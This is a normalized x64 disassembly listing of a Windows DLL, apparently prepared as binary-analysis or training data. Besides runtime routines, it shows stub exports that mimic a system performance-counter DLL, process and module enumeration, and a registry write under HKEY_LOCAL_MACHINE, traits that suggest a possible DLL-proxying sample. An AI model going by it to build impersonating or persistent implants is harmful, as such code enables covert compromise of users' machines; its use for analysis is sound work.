mov [ rw-data ] 0x2
jmp r-xdata
mov ebx [ rbp + 0x78 ]
test ebx ebx
jne r-xdata
mov rax [ rsi ]
mov r12d [ rax + 0x14 ]
mov ecx r12d
call sub_1800125d0
cmp ebx eax
je r-xdata
mov rax [ rsi ]
mov ebx [ rax + 0x4 ]
mov [ rsp + 0x38 ] r14
mov [ rsp + 0x30 ] r14
mov r9d r13d
mov r8 rdi
xor edx edx
mov ecx ebx
mov [ rsp + 0x28 ] r14d
mov [ rsp + 0x20 ] r14
call [ WideCharToMultiByte@IAT ]
test eax eax
movsxd r14 eax
je r-xdata
cmp eax 0xffffffff
cmovne ebx eax
jle r-xdata
cmp r14 0xffffffffffffffe0
ja r-xdata
lea rcx [ r14 + 0x10 ]
mov rdx 0xffffffffffffff0
cmp rcx 0x400
ja r-xdata
call sub_180007310
test rax rax
mov rsi rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
test rsi rsi
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_180013210
sub rsp rax
lea rsi [ rsp + 0x40 ]
test rsi rsi
je r-xdata
mov rax rdx
mov r8 r14
xor edx edx
mov rcx rsi
call sub_1800059c0
xor eax eax
mov r9d r13d
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x30 ] rax
mov r8 rdi
xor edx edx
mov ecx ebx
mov [ rsp + 0x28 ] r14d
mov [ rsp + 0x20 ] rsi
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov [ rsi ] 0xcccc
jmp r-xdata
cmp [ rsi - 0x10 ] 0xdddd
lea rcx [ rsi - 0x10 ]
jne r-xdata
lea eax [ r14 + 0x1 ]
test eax eax
jle r-xdata
add rsi 0x10
mov eax r15d
jmp r-xdata
call sub_1800085f0
movsxd rcx eax
mov rax 0x7ffffffffffffff0
cmp rcx rax
ja r-xdata
lea rcx [ rcx + rcx + 0x10 ]
cmp rcx 0x400
ja r-xdata
call sub_180007310
test rax rax
mov rdi rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
test rdi rdi
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_180013210
sub rsp rax
lea rdi [ rsp + 0x40 ]
test rdi rdi
je r-xdata
mov rax 0xffffffffffffff0
test r12d r12d
jne r-xdata
mov [ rdi ] 0xcccc
jmp r-xdata
mov edx [ rbp ]
mov rbx r13
add r13 r13
mov r9d r14d
mov r8 rsi
mov ecx r12d
mov [ r13 + rdi ] 0xffff
mov [ rdi + rbx * 2 - 0x2 ] 0xffff
mov [ rsp + 0x20 ] rdi
call [ GetStringTypeA@IAT ]
cmp [ rdi + rbx * 2 - 0x2 ] 0xffff
mov r15d eax
je r-xdata
mov rax [ rbp + 0x10 ]
mov rax [ rax ]
mov r12d [ rax + 0x14 ]
add rdi 0x10
xor r15d r15d
cmp [ r13 + rdi ] 0xffff
jne r-xdata
call sub_1800085f0
mov rcx [ rbp + 0x70 ]
mov r8 r13
mov rdx rdi
call sub_18000aa30
jmp r-xdata
cmp [ rdi - 0x10 ] 0xdddd
lea rcx [ rdi - 0x10 ]
jne r-xdata
sub_180012bf0
mov rax rsp
push rbx
sub rsp 0x70
mov [ rax + 0x8 ] rbp
mov [ rax + 0x18 ] rdi
xor dil dil
test rcx rcx
mov [ rax - 0x10 ] r12
mov [ rax - 0x18 ] r13
mov [ rax - 0x20 ] dil
mov ebp r9d
mov r12 r8
mov r13d edx
jne r-xdata
mov rax [ rcx ]
lea rdx [ rsp + 0x40 ]
mov [ rdx ] rax
mov rax [ rcx + 0x8 ]
mov [ rdx + 0x8 ] rax
movzx edi [ rsp + 0x58 ]
mov rbx [ rsp + 0x50 ]
mov [ rax + 0x10 ] rsi
call sub_18000a690
mov rcx [ rax + 0xc0 ]
mov rsi [ rax + 0xb8 ]
mov rbx rax
cmp rcx [ rw-data ]
mov [ rsp + 0x50 ] rax
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rsi
je r-xdata
add rsp 0x70
pop rbx
retn
and [ rbx + 0xc8 ] 0xfffffffd
cmp rsi [ rw-data ]
mov rsi [ rsp + 0x88 ]
je r-xdata
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
jne r-xdata
test [ rbx + 0xc8 ] 0x2
jne r-xdata
mov eax [ rbx + 0xc8 ]
test [ rw-data ] eax
jne r-xdata
call sub_18000d880
mov [ rsp + 0x40 ] rax
mov eax [ rsp + 0xb0 ]
lea rcx [ rsp + 0x40 ]
mov r9d ebp
mov [ rsp + 0x30 ] eax
mov eax [ rsp + 0xa8 ]
mov r8 r12
mov [ rsp + 0x28 ] eax
mov rax [ rsp + 0xa0 ]
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_1800128d0
mov r13 [ rsp + 0x60 ]
mov r12 [ rsp + 0x68 ]
mov rbp [ rsp + 0x80 ]
test dil dil
mov rdi [ rsp + 0x90 ]
je r-xdata
or [ rbx + 0xc8 ] 0x2
mov dil 0x1
mov [ rsp + 0x58 ] dil
jmp r-xdata
call sub_18000cd30
mov [ rsp + 0x48 ] rax
sub_180012d30
sub rsp 0x48
xor eax eax
lea rcx [ r--data ]
xor r9d r9d
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x28 ] eax
lea r8d [ rax + 0x3 ]
mov edx 0x40000000
mov [ rsp + 0x20 ] 0x3
call [ CreateFileA@IAT ]
mov [ rw-data ] rax
add rsp 0x48
retn
sub_180012d70
sub rsp 0x28
mov rcx [ rw-data ]
cmp rcx 0xffffffffffffffff
je r-xdata
mov rcx [ rw-data ]
cmp rcx 0xffffffffffffffff
je r-xdata
cmp rcx 0xfffffffffffffffe
je r-xdata
add rsp 0x28
retn
cmp rcx 0xfffffffffffffffe
je r-xdata
call [ CloseHandle@IAT ]
call [ CloseHandle@IAT ]
sub_180012db0
push r12
push r13
push r14
sub rsp 0x50
test rcx rcx
mov r12d r9d
mov r13 r8
mov r14 rdx
mov [ rsp + 0x48 ] 0x0
jne r-xdata
mov rax [ rcx ]
lea rdx [ rsp + 0x30 ]
mov [ rdx ] rax
mov rax [ rcx + 0x8 ]
mov [ rdx + 0x8 ] rax
mov r10 [ rsp + 0x30 ]
call sub_18000a690
mov [ rsp + 0x40 ] rax
mov r10 [ rax + 0xc0 ]
cmp r10 [ rw-data ]
mov [ rsp + 0x30 ] r10
mov r11 [ rax + 0xb8 ]
mov [ rsp + 0x38 ] r11
je r-xdata
test r14 r14
jne r-xdata
mov [ r13 ] r14
cmp r11 [ rw-data ]
je r-xdata
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
jne r-xdata
test r12d r12d
je r-xdata
call sub_180008e80
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] 0x0
mov [ rax ] 0x16
call sub_180008d20
cmp [ rsp + 0x48 ] 0x0
je r-xdata
test [ rax + 0xc8 ] 0x2
jne r-xdata
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
jne r-xdata
call sub_18000d880
mov r11 [ rsp + 0x38 ]
mov r10 rax
mov [ rsp + 0x30 ] rax
mov rax [ rsp + 0x40 ]
mov [ rsp + 0x70 ] rbx
mov [ rsp + 0x80 ] rsi
mov [ rsp + 0x88 ] rdi
movzx edi [ r14 ]
xor esi esi
lea rbx [ r14 + 0x1 ]
cmp r12d 0x2
jl r-xdata
xor eax eax
add rsp 0x50
pop r14
pop r13
pop r12
retn
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
test r13 r13
je r-xdata
or [ rax + 0xc8 ] 0x2
mov r10 [ rsp + 0x30 ]
mov [ rsp + 0x48 ] 0x1
jmp r-xdata
call sub_18000cd30
mov r10 [ rsp + 0x30 ]
mov [ rsp + 0x38 ] rax
mov rax [ rsp + 0x40 ]
mov rax [ r10 + 0x140 ]
movzx ecx dil
mov al [ rax + rcx * 2 ]
and eax 0x8
lea r8 [ rsp + 0x30 ]
movzx ecx dil
mov edx 0x8
call sub_180011a50
mov r10 [ rsp + 0x30 ]
jmp r-xdata
cmp r12d 0x24
jg r-xdata
cmp dil 0x2d
mov [ rsp + 0x78 ] rbp
jne r-xdata
mov dil [ rbx ]
add rbx 0x1
jmp r-xdata
test eax eax
je r-xdata
cmp dil 0x2b
jne r-xdata
mov ebp [ rsp + 0x90 ]
mov dil [ rbx ]
or ebp 0x2
add rbx 0x1
jmp r-xdata
cmp [ r10 + 0x10c ] 0x1
jle r-xdata
mov ebp [ rsp + 0x90 ]
mov dil [ rbx ]
mov ebp [ rsp + 0x90 ]
add rbx 0x1
jmp r-xdata
test r12d r12d
js r-xdata
test r13 r13
je r-xdata
cmp r12d 0x1
je r-xdata
cmp [ rsp + 0x48 ] sil
je r-xdata
mov [ r13 ] r14
cmp r12d 0x24
jg r-xdata
xor eax eax
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
test r12d r12d
jne r-xdata
cmp r12d 0x10
jne r-xdata
cmp dil 0x30
je r-xdata
mov r11 [ r10 + 0x140 ]
xor edx edx
or eax 0xffffffff
div r12d
mov r9d eax
nop
nop
cmp dil 0x30
jne r-xdata
movzx eax [ rbx ]
cmp al 0x78
je r-xdata
mov r12d 0xa
jmp r-xdata
test r8d 0x103
je r-xdata
movsx ecx dil
sub ecx 0x30
jmp r-xdata
movzx eax [ rbx ]
cmp al 0x78
je r-xdata
mov r12d 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
sub rbx 0x1
test bpl 0x8
jne r-xdata
lea eax [ rdi - 0x61 ]
cmp al 0x19
ja r-xdata
cmp ecx r12d
jae r-xdata
mov dil [ rbx + 0x1 ]
add rbx 0x2
cmp al 0x58
jne r-xdata
mov r12d 0x8
jmp r-xdata
test bpl 0x4
jne r-xdata
test r13 r13
cmovne rbx r14
xor esi esi
jmp r-xdata
movsx ecx dil
movsx ecx dil
sub ecx 0x20
jmp r-xdata
or ebp 0x8
cmp esi r9d
jb r-xdata
call sub_180008e80
test bpl 0x1
mov [ rax ] 0x22
je r-xdata
test bpl 0x1
jne r-xdata
test r13 r13
je r-xdata
add ecx 0xffffffc9
imul esi r12d
add esi ecx
cmp esi r9d
jne r-xdata
test bpl 0x2
mov esi 0x0
setne sil
add esi 0x7fffffff
or esi 0xffffffff
jmp r-xdata
mov eax ebp
and eax 0x2
je r-xdata
test bpl 0x2
je r-xdata
mov [ r13 ] rbx
movzx ecx dil
movzx r8d [ r11 + rcx * 2 ]
test r8b 0x4
je r-xdata
or ebp 0x4
test r13 r13
jne r-xdata
cmp ecx edx
jbe r-xdata
test eax eax
jne r-xdata
cmp esi 0x80000000
ja r-xdata
cmp [ rsp + 0x48 ] 0x0
je r-xdata
neg esi
mov dil [ rbx ]
add rbx 0x1
jmp r-xdata
cmp esi 0x7fffffff
jbe r-xdata
mov eax esi
jmp r-xdata
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
mov rbp [ rsp + 0x78 ]
mov rsi [ rsp + 0x80 ]
mov rbx [ rsp + 0x70 ]
mov rdi [ rsp + 0x88 ]
add rsp 0x50
pop r14
pop r13
pop r12
retn
sub_180013140
sub rsp 0x38
cmp [ rw-data ] 0x0
mov r9d r8d
mov r8 rdx
mov rdx rcx
mov [ rsp + 0x20 ] 0x0
jne r-xdata
xor ecx ecx
call sub_180012db0
add rsp 0x38
retn
lea rcx [ rw-data ]
call sub_180012db0
add rsp 0x38
retn
sub_1800131b0
sub rsp 0x18
mov [ rsp + 0x20 ] rcx
mov [ rsp + 0x28 ] rdx
mov [ rsp + 0x30 ] r8d
mov rdx [ rdx ]
mov rax rcx
call sub_18000eb60
call rax
call sub_18000eb90
mov rcx rax
mov rdx [ rsp + 0x28 ]
mov rdx [ rdx ]
mov r8d 0x2
call sub_18000eb60
mov [ rsp + 0x10 ] rax
add rsp 0x18
retn
sub_180013210
sub rsp 0x10
mov [ rsp ] r10
mov [ rsp + 0x8 ] r11
xor r11 r11
lea r10 [ rsp + 0x18 ]
sub r10 rax
cmovb r10 r11
mov r11 [ gs : 0x10 ]
cmp r10 r11
jae r-xdata
mov r10 [ rsp ]
mov r11 [ rsp + 0x8 ]
add rsp 0x10
retn
and r10w 0xf000
lea r11 [ r11 - 0x1000 ]
mov [ r11 ] 0x0
cmp r10 r11
jne r-xdata
sub_180013320
sub rsp 0x28
[ rw-data ] 0x1
jne r-xdata
lea rcx [ sub_1800133f0 ]
add rsp 0x28
jmp sub_180008210
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x20 ] rdi
mov edi 0x4
lea rbx [ rw-data ]
mov rcx rbx
call InitializeCriticalSection
add rbx 0x28
sub rdi 0x1
jne r-xdata
mov rdi [ rsp + 0x20 ]
mov rbx [ rsp + 0x30 ]
sub_1800133f0
sub rsp 0x28
[ rw-data ] 0xffffffff
jns r-xdata
add rsp 0x28
retn
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x20 ] rdi
mov edi 0x4
lea rbx [ rw-data ]
mov rcx rbx
call DeleteCriticalSection
add rbx 0x28
sub rdi 0x1
jne r-xdata
mov rdi [ rsp + 0x20 ]
mov rbx [ rsp + 0x30 ]
sub_180001090
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov rax [ rsp + 0x30 ]
mov rcx [ rax ]
call [ CloseHandle@IAT ]
mov rax [ rsp + 0x30 ]
add rax 0x38
mov rcx rax
call [ DeleteCriticalSection@IAT ]
add rsp 0x28
retn
sub_1800015d0
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov rax [ rsp + 0x30 ]
add rax 0x38
mov rcx rax
call [ EnterCriticalSection@IAT ]
add rsp 0x28
retn
sub_180001600
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov rax [ rsp + 0x30 ]
add rax 0x38
mov rcx rax
call [ LeaveCriticalSection@IAT ]
add rsp 0x28
retn
sub_180001620
mov [ rsp + 0x8 ] rcx
mov rax [ rsp + 0x8 ]
mov [ rax ] 0x0
mov rax [ rsp + 0x8 ]
retn
sub_180001870
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov rax [ rsp + 0x30 ]
movzx eax [ rax ]
test eax eax
jne r-xdata
call [ FreeConsole@IAT ]
mov rax [ rsp + 0x30 ]
mov [ rax ] 0x0
jmp r-xdata
add rsp 0x28
retn
sub_180001b90
push rbp
sub rsp 0x20
mov rbp rdx
lea rcx [ rbp + 0x50 ]
call sub_180003450
add rsp 0x20
pop rbp
retn
sub_180001e60
push rbp
sub rsp 0x20
mov rbp rdx
lea rcx [ rbp + 0x48 ]
call sub_1800027f0
add rsp 0x20
pop rbp
retn
sub_1800020a0
push rbp
sub rsp 0x20
mov rbp rdx
lea rcx [ rbp + 0x50 ]
call sub_180003450
add rsp 0x20
pop rbp
retn
sub_1800020c0
push rbp
sub rsp 0x20
mov rbp rdx
lea rcx [ rbp + 0x78 ]
call sub_1800027f0
add rsp 0x20
pop rbp
retn
sub_180002280
push rbp
sub rsp 0x20
mov rbp rdx
lea rcx [ rbp + 0x50 ]
call sub_180003450
add rsp 0x20
pop rbp
retn
sub_1800022a0
push rbp
sub rsp 0x20
mov rbp rdx
lea rcx [ rbp + 0x78 ]
call sub_1800027f0
add rsp 0x20
pop rbp
retn
sub_180002720
mov [ rsp + 0x10 ] edx
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov edx [ rsp + 0x38 ]
mov rcx [ rsp + 0x30 ]
call sub_1800073e0
add rsp 0x28
retn
sub_180002810
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov rdx [ rsp + 0x38 ]
mov rcx [ rsp + 0x30 ]
call sub_180002860
add rsp 0x28
retn
sub_180002860
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov r9 [ r--data ]
xor r8d r8d
mov rdx [ rsp + 0x38 ]
mov rcx [ rsp + 0x30 ]
call sub_180002890
add rsp 0x28
retn
sub_1800029a0
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov rcx [ rsp + 0x38 ]
call sub_180003240
mov r8 rax
mov rdx [ rsp + 0x38 ]
mov rcx [ rsp + 0x30 ]
call sub_180002ab0
add rsp 0x28
retn
sub_180002a70
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov rdx [ rsp + 0x38 ]
mov rcx [ rsp + 0x30 ]
call sub_1800039f0
mov rax [ rsp + 0x30 ]
add rsp 0x28
retn
sub_180002aa0
mov [ rsp + 0x8 ] rcx
mov rax [ rsp + 0x8 ]
retn
sub_1800030b0
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
xor edx edx
mov rcx [ rsp + 0x38 ]
call sub_180003170
add rsp 0x28
retn
sub_180003160
sub rsp 0x18
mov al [ rsp ]
add rsp 0x18
retn
sub_1800031e0
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov r9 [ rsp + 0x48 ]
mov r8 [ rsp + 0x40 ]
mov rdx [ rsp + 0x38 ]
mov rcx [ rsp + 0x30 ]
call sub_180003260
add rsp 0x28
retn
sub_180003220
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
mov rax [ rsp + 0x8 ]
mov rcx [ rsp + 0x10 ]
movzx ecx [ rcx ]
mov [ rax ] cx
retn
sub_180003240
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov rcx [ rsp + 0x30 ]
call sub_180007810
add rsp 0x28
retn
sub_1800032f0
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
lea rdx [ rsp + 0x38 ]
mov rcx [ rsp + 0x30 ]
call sub_180007610
mov rax [ rsp + 0x30 ]
lea rcx [ r--data ]
mov [ rax ] rcx
mov rax [ rsp + 0x30 ]
add rsp 0x28
retn
sub_180003330
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov rax [ rsp + 0x30 ]
lea rcx [ r--data ]
mov [ rax ] rcx
mov rcx [ rsp + 0x30 ]
call sub_180007770
add rsp 0x28
retn
sub_180003450
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
xor r8d r8d
mov dl 0x1
mov rcx [ rsp + 0x30 ]
call sub_180003600
add rsp 0x28
retn
sub_180003470
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov rcx [ rsp + 0x30 ]
call sub_1800039b0
add rsp 0x28
retn
sub_1800035a0
mov [ rsp + 0x8 ] rcx
mov rax [ rsp + 0x8 ]
mov rax [ rax + 0x18 ]
retn
sub_1800035b0
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov rcx [ rsp + 0x38 ]
call sub_1800035e0
mov r8 rax
mov rdx [ rsp + 0x38 ]
mov rcx [ rsp + 0x30 ]
call sub_1800036a0
add rsp 0x28
retn
sub_1800035e0
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov rcx [ rsp + 0x30 ]
call sub_1800071b0
add rsp 0x28
retn
sub_1800038b0
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
mov rax [ rsp + 0x8 ]
mov rcx [ rsp + 0x10 ]
movzx ecx [ rcx ]
mov [ rax ] cl
retn
sub_1800039f0
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
mov rax [ rsp + 0x8 ]
retn
sub_180003a00
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov rcx [ rsp + 0x38 ]
call j_sub_1800085f0#2
add rsp 0x28
retn
sub_180003ce0
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
xor edx edx
mov rcx [ rsp + 0x38 ]
call sub_180004000
add rsp 0x28
retn
sub_180003d00
mov [ rsp + 0x8 ] rcx
sub rsp 0x18
mov [ rsp ] 0xffffffffffffffff
cmp [ rsp ] 0x0
jbe r-xdata
mov [ rsp + 0x8 ] 0x1
mov rax [ rsp ]
mov [ rsp + 0x8 ] rax
jmp r-xdata
mov rax [ rsp + 0x8 ]
add rsp 0x18
retn
sub_180003d90
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov r9 [ rsp + 0x48 ]
mov r8 [ rsp + 0x40 ]
mov rdx [ rsp + 0x38 ]
mov rcx [ rsp + 0x30 ]
call sub_180003dd0
add rsp 0x28
retn
sub_180003e60
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov r9 [ rsp + 0x48 ]
mov r8 [ rsp + 0x40 ]
mov rdx [ rsp + 0x38 ]
mov rcx [ rsp + 0x30 ]
call sub_180003ea0
add rsp 0x28
retn
sub_180003f80
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov r9 [ rsp + 0x48 ]
mov r8 [ rsp + 0x40 ]
mov rdx [ rsp + 0x38 ]
mov rcx [ rsp + 0x30 ]
call sub_180003fc0
add rsp 0x28
retn
sub_180004070
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov rdx [ rsp + 0x38 ]
mov rcx [ rsp + 0x30 ]
call sub_1800076c0
mov rax [ rsp + 0x30 ]
lea rcx [ r--data ]
mov [ rax ] rcx
mov rax [ rsp + 0x30 ]
add rsp 0x28
retn
sub_180004160
mov [ rsp + 0x20 ] r9d
mov [ rsp + 0x18 ] r8d
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x18
mov [ rsp ] 0x0
mov eax [ rsp ]
add rsp 0x18
retn
sub_1800042b0
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x30
mov rbp rdx
mov [ rbp + 0x50 ] 0x1
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x30
pop rbp
retn
sub_180004b60
sub rsp 0x28
lea rcx [ rw-data ]
call sub_180001190
lea rcx [ rw-data ]
call sub_180001190
mov eax 0x1
add rsp 0x28
retn
sub_180004b90
mov [ rsp + 0x8 ] ecx
sub rsp 0x38
mov [ rsp + 0x28 ] 0x4
lea rax [ rsp + 0x40 ]
mov [ rsp + 0x20 ] rax
mov r9d 0x4
lea r8 [ r--data ]
lea rdx [ r--data ]
mov rcx 0xffffffff80000002
call [ SHSetValueW@IAT ]
add rsp 0x38
retn
InEXP
sub rsp 0x38
mov [ rsp + 0x20 ] 0x0
call sub_180005210
mov [ rsp + 0x20 ] eax
cmp [ rsp + 0x20 ] 0x0
je r-xdata
mov eax 0x1
add rsp 0x38
retn
mov edx [ rsp + 0x20 ]
lea rcx [ rw-data ]
call sub_1800044b0
LoadPerfCounterTextStringsW
xor eax eax
retn
UnloadPerfCounterTextStringsW
xor eax eax
retn
sub_180005380
mov [ rsp + 0x10 ] dx
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
movzx edx [ rsp + 0x38 ]
mov rcx [ rsp + 0x30 ]
call sub_180007cf0
add rsp 0x28
retn
sub_1800053b0
mov [ rsp + 0x10 ] edx
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov edx [ rsp + 0x38 ]
mov rcx [ rsp + 0x30 ]
call sub_180007fa0
add rsp 0x28
retn
sub_180005420
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov rdx [ rsp + 0x38 ]
mov rcx [ rsp + 0x30 ]
call sub_1800029a0
add rsp 0x28
retn
sub_180005450
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov r8 [ rsp + 0x38 ]
mov edx 0x100
mov rcx [ rsp + 0x30 ]
call sub_180007fe0
add rsp 0x28
retn
sub_180005480
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov r8 [ rsp + 0x38 ]
mov edx 0x20
mov rcx [ rsp + 0x30 ]
call sub_180007fe0
add rsp 0x28
retn
Process32NextW
jmp [ Process32NextW@IAT ]
Process32FirstW
jmp [ Process32FirstW@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
Module32NextW
jmp [ Module32NextW@IAT ]
Module32FirstW
jmp [ Module32FirstW@IAT ]
sub_180005500
movsxd rax [ rcx ]
lea rcx [ rax + rax * 4 ]
lea rax [ rw-data ]
lea rcx [ rax + rcx * 8 ]
jmp LeaveCriticalSection
j_sub_1800074e0
jmp sub_1800074e0
sub_180005530
cmp [ rcx + 0x38 ] 0x10
jb r-xdata
lea rax [ rcx + 0x20 ]
retn
mov rax [ rcx + 0x20 ]
retn
sub_1800056a0
push rbp
sub rsp 0x20
mov rbp rdx
lea rcx [ rbp + 0x28 ]
call sub_180003450
add rsp 0x20
pop rbp
retn
sub_1800056c0
push rbp
sub rsp 0x20
mov rbp rdx
lea rcx [ rbp + 0x50 ]
call sub_180007770
add rsp 0x20
pop rbp
retn
sub_180005750
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x40 ]
call sub_180007770
add rsp 0x20
pop rbp
retn
sub_1800057e0
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x40 ]
call sub_180007770
add rsp 0x20
pop rbp
retn
sub_180005890
push rbp
sub rsp 0x20
mov rbp rdx
lea rcx [ rbp + 0x28 ]
call sub_180003450
add rsp 0x20
pop rbp
retn
sub_1800058b0
push rbp
sub rsp 0x20
mov rbp rdx
lea rcx [ rbp + 0x50 ]
call sub_180007770
add rsp 0x20
pop rbp
retn
sub_180005940
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x40 ]
call sub_180007770
add rsp 0x20
pop rbp
retn
InitializeCriticalSection
jmp [ InitializeCriticalSection@IAT ]
DeleteCriticalSection
jmp [ DeleteCriticalSection@IAT ]
EnterCriticalSection
jmp [ EnterCriticalSection@IAT ]
LeaveCriticalSection
jmp [ LeaveCriticalSection@IAT ]
j_sub_1800085f0#2
jmp sub_1800085f0
sub_180005c30
push rbp
sub rsp 0x30
mov rbp rdx
mov rcx [ rbp + 0x50 ]
call sub_180005e40
add rsp 0x30
pop rbp
retn
sub_180005c50
lea rax [ rw-data ]
retn
sub_180005d60
sub rsp 0x28
call sub_180008c60
cmp [ rw-data ] 0x0
je r-xdata
mov rcx [ rw-data ]
add rsp 0x28
jmp sub_1800085f0
call sub_180009340
sub_180005e90
cmp ecx 0x14
jge r-xdata
lea rcx [ rdx + 0x30 ]
jmp [ LeaveCriticalSection@IAT ]
and [ rdx + 0x18 ] 0xffff7fff
add ecx 0x10
jmp sub_180009980
sub_1800061b0
push rbp
sub rsp 0x30
mov rbp rdx
mov rcx [ rbp + 0x48 ]
call sub_180005e40
add rsp 0x30
pop rbp
retn
sub_1800064b0
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xa
call sub_180009980
add rsp 0x20
pop rbp
retn
sub_1800064d0
movsxd rax ecx
lea r8 [ rw-data ]
mov cl al
mov rdx rax
and ecx 0x1f
sar rdx 0x5
mov rax [ r8 + rdx * 8 ]
imul rcx rcx 0x58
lea rcx [ rax + rcx + 0x10 ]
jmp [ LeaveCriticalSection@IAT ]
sub_180006730
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xa
call sub_180009980
add rsp 0x20
pop rbp
retn
sub_180006750
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xb
call sub_180009980
add rsp 0x20
pop rbp
retn
j_sub_1800085f0
jmp j_sub_1800085f0#2
sub_180006ae0
push rbx
sub rsp 0x20
mov rbx rcx
call sub_18000a690
mov [ rax + 0x128 ] rbx
add rsp 0x20
pop rbx
retn
sub_180006b00
push rbx
sub rsp 0x20
mov rbx rcx
call sub_18000a690
mov [ rax + 0x130 ] rbx
add rsp 0x20
pop rbx
retn
sub_1800075f0
lea rax [ r--data ]
mov [ rcx ] rax
xor eax eax
mov [ rcx + 0x8 ] rax
mov [ rcx + 0x10 ] eax
mov rax rcx
retn
sub_1800076a0
lea rax [ r--data ]
mov [ rcx ] rax
mov rax [ rdx ]
mov [ rcx + 0x10 ] 0x0
mov [ rcx + 0x8 ] rax
mov rax rcx
retn
sub_180007770
sub rsp 0x28
cmp [ rcx + 0x10 ] 0x0
lea rax [ r--data ]
mov [ rcx ] rax
je r-xdata
add rsp 0x28
retn
mov rcx [ rcx + 0x8 ]
call sub_1800085f0
sub_1800077a0
mov rax [ rcx + 0x8 ]
test rax rax
jne r-xdata
retn 0x0
lea rax [ r--data ]
sub_180007810
mov rax rcx
movzx edx [ rax ]
add rax 0x2
test dx dx
jne r-xdata
sub rax rcx
sar rax 0x1
sub rax 0x1
retn
sub_180007fd0
xor edx edx
lea r8d [ rdx + 0xa ]
jmp sub_18000e0b0
sub_1800081f0
push rbp
sub rsp 0x20
mov rbp rdx
call sub_1800094b0
add rsp 0x20
pop rbp
retn
sub_180008210
sub rsp 0x28
call sub_1800080e0
neg rax
sbb eax eax
neg eax
sub eax 0x1
add rsp 0x28
retn
sub_180008590
push rbp
sub rsp 0x20
mov rbp rdx
mov rax [ rcx ]
mov rdx rcx
mov ecx [ rax ]
call sub_18000ea50
add rsp 0x20
pop rbp
retn
sub_180008c10
push rbp
sub rsp 0x20
mov rbp rdx
movsxd rcx [ rbp + 0x20 ]
